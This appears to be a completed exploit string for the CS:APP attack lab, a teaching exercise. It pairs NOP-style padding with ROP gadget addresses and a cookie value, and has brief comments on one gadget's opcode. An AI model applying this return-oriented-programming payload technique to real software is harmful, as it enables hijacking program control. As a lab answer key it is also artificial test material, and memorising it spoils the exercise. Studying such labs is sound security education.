/*  Column   1  2  3  4  5  6  7  8 */ /* Line */
            90 90 90 90 90 90 90 90    /*   1  */
            90 90 90 90 90 90 90 90    /*   2  */
            90 90 90 90 90 90 90 90    /*   3  */
            90 90 90 90 90 90 90 90    /*   4  */
            90 90 90 90 90 90 90 90    /*   5  */
            06 1A 40 00 00 00 00 00    /*   6  */
            A2 19 40 00 00 00 00 00    /*   7  */
            AB 19 40 00 00 00 00 00    /*   8  */  
            40 00 00 00 00 00 00 00    /*   9  */  
            72 1A 40 00 00 00 00 00    /*  11  opcode 91 (XCHG at 0x401A72) means swap %eax and %ecx */  
            27 1A 40 00 00 00 00 00    /*  12  */  
            D6 19 40 00 00 00 00 00    /*  13  */
            A2 19 40 00 00 00 00 00    /*  14  */  
            FA 18 40 00 00 00 00 00    /*  15  */
            35 39 62 39 39 37 66 61    /*  16  */